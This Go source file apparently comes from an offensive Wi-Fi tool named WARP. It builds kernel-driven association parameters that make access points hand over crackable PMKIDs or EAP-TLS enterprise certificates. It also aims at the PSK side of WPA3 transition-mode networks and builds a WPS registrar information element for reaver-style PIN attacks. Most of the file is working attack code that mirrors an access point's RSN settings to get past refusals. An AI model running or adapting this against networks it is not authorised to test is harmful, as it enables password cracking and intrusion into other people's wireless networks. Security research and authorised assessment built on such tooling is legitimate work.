package daemon

import (
	"fmt"
	"strings"

	"github.com/waffl3ss/warp/internal/radio/nl80211"
	"github.com/waffl3ss/warp/internal/recon"
)

// connectParamsForAP maps a discovered access point to the parameters for a kernel-driven station
// association (radio.AcquireStation → nl80211.CMD_CONNECT).
//
// This is the firmware-ACK route to provoking a PMKID or a certificate: rather than forging an
// association in active monitor and hoping the driver acknowledges the replies, the kernel runs
// the exchange and the chip ACKs the access point the way it does for a real client. The
// association does not need to succeed - WARP has no credentials - it only needs to get far enough
// for the access point to volunteer the frame we are after (the enterprise certificate arrives at
// the start of EAP-TLS, before authentication; a PSK M1 carries the PMKID before the four-way).
//
// The crypto offered mirrors what the access point actually advertised in its RSN element -
// the exact pairwise/group ciphers, AKM suites and 802.11w posture - rather than a guessed
// WPA2+CCMP. An enterprise access point refuses an association whose RSN does not match what it
// broadcasts (a bare "status 1" refusal is the common symptom), and modern estates run GCMP,
// 802.1X-SHA256, WPA3 and required management frame protection, none of which a CCMP guess covers.
// SAE and WEP return ok=false - SAE needs a passphrase to get anywhere and its PMKID is not
// crackable anyway (see crackableCheck), and WEP has no association worth driving.
func connectParamsForAP(ap recon.AP) (nl80211.ConnectParams, bool) {
	if ap.ESSID == "" || ap.Freq == 0 {
		return nl80211.ConnectParams{}, false
	}

	bssid := ap.BSSID // copy so the slice below does not alias the tracker's storage
	p := nl80211.ConnectParams{
		SSID:     []byte(ap.ESSID),
		BSSID:    bssid[:],
		FreqMHz:  ap.Freq,
		AuthType: nl80211.AuthTypeOpenSystem,
	}

	enterprise := false
	switch ap.Security.Class {
	case recon.SecWPAEnterprise, recon.SecWPA3Ent192:
		enterprise = true
		// The EAP-TLS client runs over the association's control port, carried over nl80211 (the
		// data path does not carry EAPOL on many drivers). radio.Associate forces this on too; it
		// is set here so the parameters describe the intent on their own.
		p.ControlPortOverNL80211 = true

	case recon.SecWPAPSK:
		// PSK: crypto mirrored below, no control port needed.

	case recon.SecWPASAE:
		// Pure WPA3-SAE has no crackable material and mandates 802.11w, so there is nothing to
		// solicit. **Transition mode is different**: the BSS advertises SAE *and* PSK, and the PSK
		// side sends a crackable PMKID in M1. Associate on that side by offering only the PSK AKM
		// (offering SAE too invites the kernel to run dragonfly, which needs a passphrase). CCMP is
		// universal on the PSK side of a transition BSS; MFP is mirrored (transition APs advertise
		// it capable, not required, so a PSK client can still join).
		if !ap.Security.Transition {
			return nl80211.ConnectParams{}, false
		}
		p.WPAVersions = nl80211.WPAVersion2
		p.Pairwise = []uint32{nl80211.CipherCCMP128}
		p.Group = nl80211.CipherCCMP128
		p.AKMs = []uint32{nl80211.AKMPSK}
		if g := groupCipherOf(ap); g != 0 {
			p.Group = g
		}
		p.MFP = mfpForAssociation(ap)
		return p, true

	case recon.SecOpen, recon.SecOWE:
		// No crypto attributes: an open association elicits nothing sensitive; left ok=true so a
		// caller may use it deliberately.
		return p, true

	default:
		// WEP, unknown: no association worth driving for our purposes.
		return nl80211.ConnectParams{}, false
	}

	applyRSN(&p, ap, enterprise)
	return p, true
}

// groupCipherOf returns the access point's advertised group cipher as an nl80211 selector, or 0
// if the RSN element is absent or unparseable. Transition associations mirror it so a BSS running
// GCMP as its group cipher is not refused for offering CCMP.
func groupCipherOf(ap recon.AP) uint32 {
	if len(ap.Security.RSNElement) == 0 {
		return 0
	}
	rsn, err := recon.ParseRSN(ap.Security.RSNElement)
	if err != nil {
		return 0
	}
	return suiteSelector(rsn.GroupCipher)
}

// wpsConnectParams builds the parameters for a WPS registrar association.
//
// A WPS enrollee/registrar associates *open* - no RSN - carrying a WSC information element, and
// that is what makes an access point run the EAP-WSC registration protocol rather than the WPA
// four-way handshake. This is not the association PMKID and the harvest make (they mirror the AP's
// RSN through the connection manager); it is the one reaver makes, and two things follow from that:
//
//   - No RSN is offered. Mirroring the AP's RSN makes it treat WARP as an ordinary client and run
//     the four-way, and on a real access point an RSN association carrying a WSC element is simply
//     refused (802.11 status 1).
//   - It cannot go through CMD_CONNECT, which refuses an open association to a secured AP. It is
//     driven by hand with CMD_AUTHENTICATE + CMD_ASSOCIATE instead (ManualMLME), so the open+WSC
//     association goes out kernel-driven, with the firmware acknowledging the AP.
//
// EAP-WSC then rides the 802.1X control port, same as the certificate harvest. Returns ok=false for
// a network with no name or channel to associate to.
func wpsConnectParams(ap recon.AP) (nl80211.ConnectParams, bool) {
	if ap.ESSID == "" || ap.Freq == 0 {
		return nl80211.ConnectParams{}, false
	}
	bssid := ap.BSSID
	return nl80211.ConnectParams{
		SSID:                   []byte(ap.ESSID),
		BSSID:                  bssid[:],
		FreqMHz:                ap.Freq,
		AuthType:               nl80211.AuthTypeOpenSystem,
		ControlPortOverNL80211: true,
		ExtraIE:                wpsAssocIE(),
		ManualMLME:             true,
	}, true
}

// wpsAssocIE builds the WSC information element for a WPS association request, advertising WARP as
// an external Registrar. The element is a vendor-specific IE carrying the WPS OUI and two TLVs -
// Version and Request Type - which is the minimum an access point needs to see to start EAP-WSC.
func wpsAssocIE() []byte {
	const (
		attrVersion      = 0x104A
		attrRequestType  = 0x103A
		requestRegistrar = 0x02
	)
	body := []byte{0x00, 0x50, 0xF2, 0x04} // WPS OUI (00:50:F2) + type 4 (WPS)
	// TLV: 2-byte type, 2-byte length, value.
	body = append(body, byte(attrVersion>>8), byte(attrVersion&0xFF), 0x00, 0x01, 0x10)
	body = append(body, byte(attrRequestType>>8), byte(attrRequestType&0xFF), 0x00, 0x01, requestRegistrar)
	return append([]byte{0xDD, byte(len(body))}, body...)
}

// mfpForAssociation maps an access point's 802.11w posture to the MFP mode WARP requests when it
// associates to harvest a certificate, read a PMKID or run WPS.
//
// A *required* AP gets MFPRequired - the standard mode, supported everywhere. A *capable* AP gets
// no MFP at all, deliberately NOT NL80211_MFP_OPTIONAL: that value makes CMD_CONNECT return
// -EOPNOTSUPP ("operation not supported") on any driver that does not advertise
// NL80211_EXT_FEATURE_MFP_OPTIONAL, mt76 among them - the exact error that killed the cert harvest
// against an MFP-capable enterprise AP while a no-MFP test AP worked. Dropping it is correct here,
// not a shortcut: every one of these exchanges abandons the association before the four-way
// handshake, and PMF protects management frames only *after* keys are installed, so it never comes
// into play. An MFP-capable-but-not-required AP associates a non-PMF client by definition, which is
// exactly what WARP is.
func mfpForAssociation(ap recon.AP) int {
	if ap.Security.MFP == recon.MFPRequired {
		return nl80211.MFPRequired
	}
	return nl80211.MFPNo
}

// applyRSN fills the crypto parameters from the access point's advertised RSN element, falling
// back to a plain WPA2/CCMP offer when the element could not be parsed.
func applyRSN(p *nl80211.ConnectParams, ap recon.AP, enterprise bool) {
	if len(ap.Security.RSNElement) > 0 {
		if rsn, err := recon.ParseRSN(ap.Security.RSNElement); err == nil && len(rsn.PairwiseCipher) > 0 {
			p.WPAVersions = nl80211.WPAVersion2
			p.Group = suiteSelector(rsn.GroupCipher)
			for _, s := range rsn.PairwiseCipher {
				p.Pairwise = append(p.Pairwise, suiteSelector(s))
			}
			for _, s := range rsn.AKM {
				p.AKMs = append(p.AKMs, suiteSelector(s))
			}
			p.MFP = mfpForAssociation(ap)
			return
		}
	}

	// Fallback: the element was absent or unparseable. Offer the standard WPA2 suite for the
	// class, which covers the common case, and mirror MFP if we know it.
	p.WPAVersions = nl80211.WPAVersion2
	p.Pairwise = []uint32{nl80211.CipherCCMP128}
	p.Group = nl80211.CipherCCMP128
	if enterprise {
		p.AKMs = []uint32{nl80211.AKM8021X}
	} else {
		p.AKMs = []uint32{nl80211.AKMPSK}
	}
	p.MFP = mfpForAssociation(ap)
}

// suitesHex renders a list of suite selectors as hex, for the diagnostic log.
func suitesHex(suites []uint32) string {
	parts := make([]string, len(suites))
	for i, s := range suites {
		parts[i] = fmt.Sprintf("0x%08x", s)
	}
	return strings.Join(parts, ",")
}

// suiteSelector converts a parsed RSN cipher/AKM suite to the 32-bit selector nl80211 wants: the
// three-byte OUI in the high bytes and the suite type in the low byte, which is the big-endian
// reading of the four bytes as they appear in the RSN element (00-0F-AC-04 → 0x000FAC04 for CCMP).
func suiteSelector(s recon.Suite) uint32 {
	return uint32(s.OUI[0])<<24 | uint32(s.OUI[1])<<16 | uint32(s.OUI[2])<<8 | uint32(s.Type)
}
